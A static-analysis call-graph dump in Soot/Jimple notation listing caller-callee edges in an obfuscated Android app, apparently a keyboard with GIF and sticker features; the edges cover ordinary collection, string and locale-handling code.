INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lly: void <init>()> ==> <lkg: void <init>(int)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(0) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r9.<mag: void <init>(java.lang.String,int,int)>("AUTOCOMPLETE", 9, 9) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r26.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i9, $r15, $r16, null, null) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>(r0) in <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()> ==> <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $z0 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r1, $r2) in <hbv: boolean o()> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hbw: void <init>(int)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.lang.Iterable: java.util.Iterator iterator()>() in <izw: java.util.Collection at(java.lang.Iterable)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r1, $i2, $r23) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke r0.<lme: void <init>(lkx,int)>($r1, 0) in <ljs: void <init>()> ==> <lme: void <init>(lkx,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c0) in <ivw: boolean u(char)> ==> <ivw: boolean x(char)>
VIRTUAL edge: virtualinvoke r0.<ljd: int b()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int b()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lje: boolean hasNext()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(5) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfb: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: java.util.Set f()> ==> <ljf: void h()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r16.<lsu: void <init>()>() in <lsd: boolean b(lsr)> ==> <lsu: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c3) in <ivw: boolean w(char[],int,int)> ==> <ivw: boolean u(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lje: void <init>(ljf)> ==> <java.lang.Object: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Thread: java.lang.Thread currentThread()>() in <ojg: void v(java.lang.String)> ==> <java.lang.Thread: java.lang.Thread currentThread()>
STATIC edge: $r3 = staticinvoke <lme: lmb g()>() in <hbv: void j()> ==> <lme: lmb g()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <ltr: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r15.<mag: void <init>(java.lang.String,int,int)>("BITMOJI_IMAGE", 15, 15) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Error: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <miv: void <init>(java.lang.Object)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lvr: boolean isEmpty()>() in <lvt: boolean a()> ==> <java.util.AbstractMap: boolean isEmpty()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r4, $i0) in <lsn: void q(lsz,java.lang.Object)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean s(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <lvs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvs: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int j()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $z0 = staticinvoke <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>($r2, $r3, $l0, $r1) in <j$.sun.misc.b: boolean e(java.lang.Object,long,java.lang.Object)> ==> <j$.sun.misc.a: boolean a(sun.misc.Unsafe,java.lang.Object,long,java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Character$UnicodeBlock: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Character$UnicodeBlock: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r3, $i3, $i6) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <lum: lvm i()>() in <lum: boolean n(java.lang.String,java.util.logging.Level,boolean)> ==> <lum: lvm i()>
STATIC edge: $r4 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r4, $i0) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
STATIC edge: $r4 = staticinvoke <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>($r3, $r1, $i0, $r2) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(7) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r4, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String e(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <iwt: java.lang.String e(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_GRPC_FEATURE", 16, 16) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r22.<mag: void <init>(java.lang.String,int,int)>("LOCAL", 22, 22) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<ljs: void <init>()>() in <ljs: void <clinit>()> ==> <ljs: void <init>()>
CLINIT edge: staticinvoke <bel: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <bel: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(17) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <lak: void <init>(byte[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsb: java.lang.Object a(int)>($i1) in <lsb: java.lang.Object next()> ==> <lnd: java.lang.Object a(int)>
STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(long[],long[])>($r10, $r11) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(long[],long[])>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(16) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r4.<hbv: void <init>(java.lang.String)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <hbv: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <iwt: boolean k(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean k(char)>
VIRTUAL edge: virtualinvoke $r3.<hbv: void k(java.lang.Object,boolean)>($r1, 0) in <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)> ==> <hbv: void k(java.lang.Object,boolean)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
CLINIT edge: staticinvoke <ltc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltc: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(19) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r3, $r4) in <lqm: java.lang.Object get(int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lwe: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwe: void <clinit>()>
SPECIAL edge: $i2 = specialinvoke r0.<lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>($r6, $i3, $i2, $r4, $r5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])>
CLINIT edge: staticinvoke <hcb: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hcb: void <clinit>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Gif", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $l0 = virtualinvoke $r0.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/r;", "lockState") in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
CLINIT edge: staticinvoke <idq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <idq: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<lkq: boolean isEmpty()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r4.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i5, $r2) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r1.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: int b()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r3, 0, $i0) in <ivv: ivw b(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "parser") in <lup: void <init>(lwc,java.lang.String)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>($r5, $r0, $r1, $r2, $r3) in <iwt: void <clinit>()> ==> <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<lsm: int a(lsz)>($r2) in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: int a(lsz)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lkx: lma p()>() in <llg: void <init>(llo)> ==> <lkx: lma p()>
STATIC edge: $r2 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <iwt: java.lang.String c(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r1, $i1) in <lri: void v(java.lang.Object[],int)> ==> <lri: void t(java.lang.Object,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "log site qualifier") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean y(char)>($c5) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean y(char)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: void j(java.lang.Object)> ==> <lma: int e(int)>
CLINIT edge: staticinvoke <hnc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnc: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke $r4.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hcb: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null languageTag") in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<ing: void <init>(java.lang.String,iec)>($r2, $r3) in <iej: void g(java.lang.String,iec)> ==> <ing: void <init>(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <miv: void <clinit>()> ==> <java.lang.Class: java.lang.String getName()>
CLINIT edge: staticinvoke <ljd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljd: void <clinit>()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
CLINIT edge: staticinvoke <lwh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwh: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(5) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>(null) in <miv: void <clinit>()> ==> <miv: void <init>(java.lang.Object)>
CLINIT edge: staticinvoke <gwk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gwk: void <clinit>()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <ivv: void <init>(byte[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, 1, $i1) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("PlaystoreStickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <lwg: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke $r3.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_THUMBNAIL", 3, 3) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int compareTo(java.lang.Enum)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>("array index scale not a power of two") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $l0 = staticinvoke <java.lang.System: long currentTimeMillis()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long currentTimeMillis()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String c(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int O(long,long)>($l1, $l2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kwe: int O(long,long)>
VIRTUAL edge: $r9 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("cja-XA", "doi-XA", "doi-XD", "doi-XU", "doi-Deva", "doi-Latn", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r2, $i1, $r3, 0, $i0) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r2, $i2) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r14 = staticinvoke <lkq: lkl e()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkq: lkl e()>
